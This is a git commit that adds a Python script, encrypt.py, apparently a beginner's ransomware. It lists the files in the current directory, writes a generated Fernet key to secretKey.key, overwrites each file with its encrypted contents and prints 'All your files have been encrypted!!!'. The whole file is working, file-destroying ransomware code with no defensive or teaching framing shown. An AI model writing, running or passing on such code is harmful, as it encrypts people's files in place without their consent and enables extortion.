bdba12b9d769e5ab4d01e9a7da331e2314864eb4
m0rd3cai <142639542+m0rd3caii@users.noreply.github.com>
2023-08-19 04:06:24 +0200

    Create encrypt.py

---
+++ encrypt.py
@@ -0,0 +1,30 @@
+#! /usr/bin/env python3
+
+import os 
+from cryptography.fernet import Fernet
+
+
+files = []
+
+for file in os.listdir():
+	if file =="seTenso.py" or file =="secretKey.key" or file == "seDesTenso.py":
+		continue
+	if os.path.isfile(file):  
+		files.append(file)
+print(files)
+
+
+key = Fernet.generate_key()
+
+with open("secretKey.key", "wb") as lallave:
+	lallave.write(key)
+
+#Encryptado
+for file in files:
+        with open(file,"rb") as theFile:
+                content = theFile.read()
+        contenido_encryptado = Fernet(key).encrypt(content)
+        with open(file, "wb") as theFile:
+                theFile.write(contenido_encryptado)
+
+print("All your files have been encrypted!!!")
